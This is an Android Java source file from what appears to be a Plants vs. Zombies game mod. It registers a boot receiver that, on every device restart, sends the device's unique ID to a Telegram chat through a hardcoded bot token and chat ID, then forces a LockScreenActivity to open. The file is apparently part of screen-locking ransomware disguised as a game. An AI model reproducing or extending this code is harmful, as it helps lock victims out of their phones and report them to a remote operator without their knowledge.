package com.pvzmod.game;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootReceiver extends BroadcastReceiver {
    private static final String BOT_TOKEN = "8180924483:AAHt7ySle_GRAywhYP6KZJnCMzwIDegjQoA";
    private static final String CHAT_ID = "5970230338";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            TelegramSender.sendMessage(BOT_TOKEN, CHAT_ID, 
                "🔄 Device rebooted! ID: " + DeviceIdGenerator.getUniqueId(context));
            
            Intent lockIntent = new Intent(context, LockScreenActivity.class);
            lockIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(lockIntent);
        }
    }
}